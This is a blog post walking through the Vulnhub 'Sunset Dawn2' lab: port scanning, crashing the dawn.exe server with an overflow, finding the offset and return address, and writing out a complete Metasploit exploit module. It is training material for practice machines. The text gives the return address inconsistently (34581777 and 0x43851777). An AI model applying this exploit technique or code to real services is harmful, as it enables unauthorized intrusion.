<!DOCTYPE html>



<html lang="en-US" 
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  
    <meta name="pv-cache-enabled" content="false">

    
  

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.0" />
<meta property="og:title" content="Vulnhub - Sunset Dawn2 walkthrough" />
<meta name="author" content="Matt M" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Introduction The vulnhub discription says this VM is intermediate difficulty. Some of the skills you’ll be required to use are as follows:" />
<meta property="og:description" content="Introduction The vulnhub discription says this VM is intermediate difficulty. Some of the skills you’ll be required to use are as follows:" />
<link rel="canonical" href="/posts/vulnhub-dawn2/" />
<meta property="og:url" content="/posts/vulnhub-dawn2/" />
<meta property="og:site_name" content="Matt M" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-03-03T13:38:00-06:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Vulnhub - Sunset Dawn2 walkthrough" />
<meta name="twitter:site" content="@twitter_username" />
<meta name="twitter:creator" content="@Matt M" />
<meta name="google-site-verification" content="google_meta_tag_verification" />
<script type="application/ld+json">
{"author":{"@type":"Person","name":"Matt M"},"url":"/posts/vulnhub-dawn2/","@type":"BlogPosting","description":"Introduction The vulnhub discription says this VM is intermediate difficulty. Some of the skills you’ll be required to use are as follows:","headline":"Vulnhub - Sunset Dawn2 walkthrough","dateModified":"2021-03-03T13:38:00-06:00","datePublished":"2021-03-03T13:38:00-06:00","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/vulnhub-dawn2/"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <title>Vulnhub - Sunset Dawn2 walkthrough | Matt M
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://www.favicon-generator.org/
-->



<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon">
<link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon">

<link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png">
<link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png">
<link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png">

<link rel="icon" type="image/png" sizes="192x192"  href="/assets/img/favicons/android-icon-192x192.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

<link rel="manifest" href="/assets/img/favicons/manifest.json">
<meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'>
<meta name="msapplication-TileColor" content="#ffffff">
<meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png">
<meta name="theme-color" content="#ffffff">


  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- GA -->
  

  <!-- jsDelivr CDN -->
  <link rel="preconnect" href="cdn.jsdelivr.net">
  <link rel="dns-prefetch" href="cdn.jsdelivr.net">

  <!-- Bootstrap -->
  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
    integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous">

  <!-- Font Awesome -->
  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"
    integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ="
    crossorigin="anonymous">

  <!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css">


  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">



  <!-- JavaScripts -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  <script defer
    src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script>

  <!--
  JS selector for site.
-->


  





<script defer src="/assets/js/dist/post.min.js"></script>






</head>


  <body data-spy="scroll" data-target="#toc">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">

  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto">
        
        <img src="/assets/img/images/firefly-blaze.jpg" alt="avatar" onerror="this.style.display='none'">
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">Matt M</a>
    </div>

    <div class="site-subtitle font-italic">Family. Hacking. Enduro. Overlander. Find me in the wilderness.</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">
    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i>
        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center">

    
      

      
      <a href="https://github.com/github_username" aria-label="github"
        class="order-3"
        target="_blank" rel="noopener">
        <i class="fab fa-github-alt"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/twitter_username" aria-label="twitter"
        class="order-4"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email"
        class="order-5"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        class="order-6"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

    
      
        <span class="icon-border order-2"></span>
      

      <span id="mode-toggle-wrapper" class="order-1">
        <!--
  Switch the mode between dark and light.
-->

<i class="mode-toggle fas fa-adjust"></i>

<script type="text/javascript">

  class ModeToggle {
    static get MODE_KEY() { return "mode"; }
    static get DARK_MODE() { return "dark"; }
    static get LIGHT_MODE() { return "light"; }

    constructor() {
      if (this.hasMode) {
        if (this.isDarkMode) {
          if (!this.isSysDarkPrefer) {
            this.setDark();
          }
        } else {
          if (this.isSysDarkPrefer) {
            this.setLight();
          }
        }
      }

      var self = this;

      /* always follow the system prefers */
      this.sysDarkPrefers.addListener(function() {
        if (self.hasMode) {
          if (self.isDarkMode) {
            if (!self.isSysDarkPrefer) {
              self.setDark();
            }

          } else {
            if (self.isSysDarkPrefer) {
              self.setLight();
            }
          }

          self.clearMode();
        }

        self.updateMermaid();
      });

    } /* constructor() */


    setDark() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      $('html').removeAttr(ModeToggle.MODE_KEY);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }

    get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); }

    get isSysDarkPrefer() { return this.sysDarkPrefers.matches; }

    get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; }

    get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; }

    get hasMode() { return this.mode != null; }

    get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }

    /* get the current mode on screen */
    get modeStatus() {
      if (this.isDarkMode
        || (!this.hasMode && this.isSysDarkPrefer) ) {
        return ModeToggle.DARK_MODE;
      } else {
        return ModeToggle.LIGHT_MODE;
      }
    }

    updateMermaid() {
      if (typeof mermaid !== "undefined") {
        let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default");
        let config = { theme: expectedTheme };

        /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */
        $(".mermaid").each(function() {
          let svgCode = $(this).prev().children().html();
          $(this).removeAttr("data-processed");
          $(this).html(svgCode);
        });

        mermaid.initialize(config);
        mermaid.init(undefined, ".mermaid");
      }
    }

    flipMode() {
      if (this.hasMode) {
        if (this.isSysDarkPrefer) {
          if (this.isLightMode) {
            this.clearMode();
          } else {
            this.setLight();
          }

        } else {
          if (this.isDarkMode) {
            this.clearMode();
          } else {
            this.setDark();
          }
        }

      } else {
        if (this.isSysDarkPrefer) {
          this.setLight();
        } else {
          this.setDark();
        }
      }

      this.updateMermaid();

    } /* flipMode() */

  } /* ModeToggle */

  let toggle = new ModeToggle();

  $(".mode-toggle").click(function() {

    toggle.flipMode();

  });

</script>

      </span>
    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          

        

      

        
        <span>
          
          
          <a href="/">
            Posts
          </a>
        </span>

        

      

        
          <span>Vulnhub - Sunset Dawn2 walkthrough</span>

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->


<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->


<!-- Add attribute 'hide-bullet' to the checkbox list -->




  

  

  <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
  
  

  

  



<!-- return -->
<div class="row">

  <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">

    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

      <h1 data-toc-skip>Vulnhub - Sunset Dawn2 walkthrough</h1>

      <div class="post-meta text-muted d-flex flex-column">
        <!-- Published date and author -->
        <div>
          <!--
  Date format snippet
-->





<span class="timeago "
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Wed, Mar  3, 2021,  1:38 PM -0600"
  >

  
  

  
    Mar  3
  

  <i class="unloaded">2021-03-03T13:38:00-06:00</i>

</span>

          by
          <span class="author">
            Matt M
          </span>
        </div>

        <div>
          <!-- lastmod -->
          

          <!-- read time -->
          <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->


<!-- words per minute  -->







<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1948 words">10 min</span>


          <!-- page views -->
          

        </div>

      </div> <!-- .post-meta -->

      <div class="post-content">

        

        <h2 id="introduction">Introduction</h2>
<p>The vulnhub discription says this VM is <code class="language-plaintext highlighter-rouge">intermediate</code> difficulty. Some of the skills you’ll be required to use are as follows:</p>

<ul>
  <li>basic reconnaissance</li>
  <li>port mapping</li>
  <li>unlisted file and directory discovery</li>
  <li>basic disassembly</li>
  <li>basic binary analysis</li>
</ul>

<p>And of course, creative thinking is very helpful.</p>

<h2 id="finding-the-host-on-the-network">Finding the host on the network.</h2>
<p>This part is easy. I have a small private lab I run these machines in. The DHCP server lists the hostname and IP of the VM which lives at 192.168.111.54. The DHCP server also lets me know the VM’s hardware address.
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/images/dawn2-1.png" alt="screenshot" />
Great! We’re off to the races!</p>

<h2 id="nmap-scanning-the-host">Nmap scanning the host</h2>
<p>My typical first step is to use <a href="https://nmap.org/">nmap</a> to poke and prod at the host. I’ll run with command line switches <code class="language-plaintext highlighter-rouge">-A</code>, <code class="language-plaintext highlighter-rouge">-v</code>, <code class="language-plaintext highlighter-rouge">-p-</code> and <code class="language-plaintext highlighter-rouge">-oN</code>. The switches effecitvely mean <code class="language-plaintext highlighter-rouge">enable version detection, script scanning, hit all ports and output to the specified file</code>. Let’s see what output we get. The CLI will look as follows:</p>
<div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-A</span> <span class="nt">-v</span> <span class="nt">-p-</span> 192.168.111.54 <span class="nt">-oN</span> dawn2-scan.txt
</pre></td></tr></tbody></table></code></div></div>
<p>And the relevant bits are as follows:</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/images/dawn2-2.png" alt="screenshot" /></p>

<p>Excellent! We have ports 80, 1435 and 1985 open. Let’s target port 80 first.</p>

<h2 id="port-80-analysis">Port 80 analysis</h2>
<p>Hitting port 80 in our browser gives us a basic html page. 
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/images/dawn2-3.png" alt="screenshot" />
We’re notified that the site is under construction. We’re also told there’s no <code class="language-plaintext highlighter-rouge">WAF</code> or <code class="language-plaintext highlighter-rouge">IDS</code> software to get in our way. Cool. But the noteworthy thing here is that there is a download link available in the first bullet point. Let’s grab that and see what we have.</p>
<div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>wget http://192.168.111.54/dawn.zip
</pre></td></tr></tbody></table></code></div></div>
<p>And listing the contents of the zip file:</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/images/dawn2-4.png" alt="screenshot" width="400" class="normal" /></p>

<p>We notice that we have a readable txt file and an executable. Let’s probe a little deeper. First, we’ll read the txt file in it’s entirety. The file tells us this is some sort of rudimentary server software that is missing a <code class="language-plaintext highlighter-rouge">client</code>. We’re also given a clue for our next step. The txt file says <code class="language-plaintext highlighter-rouge">the service may crash after several requests</code> which is indicative of a buffer overflow type of vulnerability. Great. Let’s chase that for a while.</p>

<h2 id="buffer-overflowing-dawnexe">Buffer overflowing dawn.exe</h2>
<p>I’ll move the dawn.exe program to a windows box in another lab and test things out there. According to the readable txt file the dawn.exe is likely an executable server software. I’ll be running<sup id="fnref:footnote1" role="doc-noteref"><a href="#fn:footnote1" class="footnote">1</a></sup> this on a quarantined Windows 10 computer that I can completely erase when this project is finished.</p>

<p>ok, running the executable I can see that it’s doing a thing.
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/images/dawn2-5.png" alt="screenshot" />
<code class="language-plaintext highlighter-rouge">The server has been started</code> and is <code class="language-plaintext highlighter-rouge">currently listening</code>. Let’s find out what port it’s listening on. I can do this using an administrative cmd.exe as follows:
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/images/dawn2-6.png" alt="screenshot" />
The output was much longer, but I’ve only given enough to make the point. Dawn.exe is listening on port 1985. Let’s see what happens when we start attacking with <code class="language-plaintext highlighter-rouge">ncat</code>, nmap’s implementation of netcat. We’ll attack from localhost on the windows box using Kali Linux within the Windows subsystem for Linux. 
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/images/dawn2-7.png" alt="screenshot" />
Nice, a successful connection. Ok, let’s try to overflow the server.</p>
<div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>perl <span class="nt">-e</span> <span class="s2">"print 'a'x100"</span> | ncat <span class="nt">-v</span> localhost 1985
</pre></td></tr></tbody></table></code></div></div>
<p>This command<sup id="fnref:footnote2" role="doc-noteref"><a href="#fn:footnote2" class="footnote">2</a></sup> will print 100 capitol As and send them to the server. We’ll likely have to try this with numerous different sized payloads to achieve our overflow condition. I changed the payload incrementaly by 100 each time I didn’t get a server crash. When I sent 300 capitol As to the server, I finally got the result I was looking for.</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/images/dawn2-8.png" alt="screenshot" width="350" /> .normal}</p>

<p>Awesome, we’ve successfully crashed the program! Using x32dbg (because this is a 32bit program) we can see we’ve completely overwritten both the ebp and eip registers with many capitol A<sup id="fnref:footnote3" role="doc-noteref"><a href="#fn:footnote3" class="footnote">3</a></sup> characters. This is gold.
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/images/dawn2-9.png" alt="screenshot" />
With this information, we know we have a strong chance of being able to inject shellcode onto the stack. Before we chase that route tho, let’s make sure this exe doesn’t have any form of stack protection enabled. If it does, that might blow our chances. I’ll use rabin2 from the <a href="https://rada.re/n/">radare2</a> project for this.</p>
<div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>rabin2 <span class="nt">-I</span> dawn.exe
</pre></td></tr></tbody></table></code></div></div>
<p>Ok, let’s analyze the output.
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/images/dawn2-10.png" alt="screenshot" />
In this lump of text output we’re looking for three things specifcally to be disabled in order to be able to exploit this binary. We must not have <code class="language-plaintext highlighter-rouge">pic, nx</code> or <code class="language-plaintext highlighter-rouge">canary</code> enabled. And according to this output, it looks like we’re in luck! Great. The next tool we’ll use is from the <a href="https://www.metasploit.com/">metasploit</a> framework, <code class="language-plaintext highlighter-rouge">msfbinscan</code>. Our goal is to overwrite <code class="language-plaintext highlighter-rouge">eip</code> with the address of <code class="language-plaintext highlighter-rouge">esp</code>. Since data is moving around on the stack, making if difficult to predict <code class="language-plaintext highlighter-rouge">esp</code>, we need to find an instruction that will “jump” to esp and overwrite with that. <code class="language-plaintext highlighter-rouge">msfbinscan</code> makes finding this easy.</p>
<div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>msfbinscan <span class="nt">-j</span> esp dawn.exe
</pre></td></tr></tbody></table></code></div></div>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/images/dawn2-11.png" alt="screenshot" />
There we are, the <code class="language-plaintext highlighter-rouge">push esp; ret</code> at address 34581777. This little string of numbers is how we break the program.</p>

<h2 id="creating-the-exploit">Creating the Exploit</h2>
<p>We need two important bits of info in order to create this exploit. The first, we already have, we acquired that in the last step. Memory address 0x43851777. The second piece we’ll need is the offset, or where the malicious instructions will need to be placed. We can find that offset using another <code class="language-plaintext highlighter-rouge">metasploit</code> tool called <code class="language-plaintext highlighter-rouge">pattern_create.rb</code>. This tool will generate a string of characters for us to send to the vulnerable machine. Let’s generate that string. We’ll use 300 since we know that overflows the buffer sufficiently.</p>
<div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb <span class="nt">-l</span> 300
</pre></td></tr></tbody></table></code></div></div>
<p>And we send that to the vulnerable server.</p>
<div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"</span> | ncat <span class="nt">-v</span> localhost 1985
</pre></td></tr></tbody></table></code></div></div>
<p>And now we can see that <code class="language-plaintext highlighter-rouge">eip</code> is no longer overwritten with 41414141, but rather 316A4130. We can now find our offset. We’ll use another <code class="language-plaintext highlighter-rouge">metasploit</code> tool , the compliment to pattern_crate.rb, <code class="language-plaintext highlighter-rouge">pattern_offset.rb</code>. We’ll use the CLI flags <code class="language-plaintext highlighter-rouge">-l</code> to specify the same length we used to generate our pattern, and <code class="language-plaintext highlighter-rouge">-q</code> to locate our query string <code class="language-plaintext highlighter-rouge">316A4130</code> within the pattern.</p>
<div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb <span class="nt">-l</span> 300 <span class="nt">-q</span> 316A4130
</pre></td></tr></tbody></table></code></div></div>

<p>And the tool reports <code class="language-plaintext highlighter-rouge">Exact match at offset 272</code>. Fantastic. Along with the metasploit framework comes an example template for a metasploit module called <code class="language-plaintext highlighter-rouge">example.rb</code>. I’ll be using that as it’s a really convenient way to write an exploit and simply use the metasploit framework to hack the box. Here is my example.rb, modified and simplified to exploit this server software.</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre></td><td class="rouge-code"><pre><span class="nb">require</span> <span class="s1">'msf/core'</span>
<span class="k">class</span> <span class="nc">Metasploit3</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span>
  <span class="no">Rank</span> <span class="o">=</span> <span class="no">NormalRanking</span>
  <span class="kp">include</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span><span class="o">::</span><span class="no">Tcp</span>

  <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">info</span> <span class="o">=</span> <span class="p">{})</span>
  <span class="k">super</span><span class="p">(</span><span class="n">update_info</span><span class="p">(</span><span class="n">info</span><span class="p">,</span>
    <span class="s1">'Name'</span> <span class="o">=&gt;</span> <span class="s1">'Buffer Overflow Example sunset dawn2 vulnhub'</span><span class="p">,</span>
    <span class="s1">'Description'</span> <span class="o">=&gt;</span> <span class="sx">%q{
      Application Exploitation Module sunset dawn2 vulnhub
    }</span><span class="p">,</span>
    <span class="s1">'Platform'</span> <span class="o">=&gt;</span> <span class="s1">'Windows'</span><span class="p">,</span>
    <span class="s1">'Author'</span> <span class="o">=&gt;</span>
      <span class="p">[</span>
        <span class="s1">'stdout'</span>
      <span class="p">],</span>

     <span class="s1">'Payload'</span> <span class="o">=&gt;</span>
      <span class="p">{</span>
        <span class="s1">'space'</span> <span class="o">=&gt;</span> <span class="mi">1000</span><span class="p">,</span>
        <span class="s1">'BadChars'</span> <span class="o">=&gt;</span> <span class="s2">"</span><span class="se">\x20\x0a\x0d\x00\xff</span><span class="s2">"</span>
      <span class="p">},</span>
     <span class="s1">'Targets'</span> <span class="o">=&gt;</span>
      <span class="p">[</span>
        <span class="p">[</span><span class="s1">'Windows'</span><span class="p">,</span> <span class="p">{</span><span class="s1">'Ret'</span> <span class="o">=&gt;</span> <span class="mh">0x34581777</span><span class="p">,</span> <span class="s1">'Offset'</span> <span class="o">=&gt;</span> <span class="mh">0x110</span><span class="p">}]</span>
      <span class="p">],</span>
     <span class="s1">'DisclosureDate'</span> <span class="o">=&gt;</span> <span class="s1">'2019-01-15'</span>
  <span class="p">))</span>

  <span class="n">register_options</span><span class="p">(</span>
  <span class="p">[</span>
   <span class="c1">#   Opt::RPORT(1985)</span>
  <span class="p">],</span><span class="nb">self</span><span class="p">.</span><span class="nf">class</span><span class="p">)</span>
  <span class="k">end</span>

  <span class="k">def</span> <span class="nf">exploit</span>
    <span class="n">connect</span>
    <span class="n">buf</span> <span class="o">=</span> <span class="n">rand_text_alpha_upper</span><span class="p">(</span><span class="n">target</span><span class="p">[</span><span class="s1">'Offset'</span><span class="p">])</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="p">[</span><span class="n">target</span><span class="p">[</span><span class="s1">'Ret'</span><span class="p">]].</span><span class="nf">pack</span><span class="p">(</span><span class="s1">'V'</span><span class="p">)</span> <span class="o">+</span> <span class="n">make_nops</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="o">+</span> <span class="n">payload</span><span class="p">.</span><span class="nf">encoded</span> <span class="o">+</span> <span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span>
    <span class="n">sock</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
    <span class="n">handler</span>
    <span class="n">disconnect</span>
   <span class="k">end</span>
<span class="k">end</span>
</pre></td></tr></tbody></table></code></div></div>
<p>We need to load this into our metasploit framework. I’m running my local metasploit framework on a MacOS (via homebrew) so this is my process.</p>
<div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">mv </span>basic_exploit.rb .msf4/modules/exploits/basic_exploit.rb
<span class="gp">$</span><span class="w"> </span>msfdb stop
</pre></td></tr></tbody></table></code></div></div>
<p>The above command will shutdown the msf database. Restart it with</p>
<div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>msfdb start
</pre></td></tr></tbody></table></code></div></div>
<p>And now start up the framework with</p>
<div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>msfconsole
</pre></td></tr></tbody></table></code></div></div>
<p>And check it out. Our module count has been incremented by one! It’s showing 2102 exploits. Previously we only had 2101.</p>

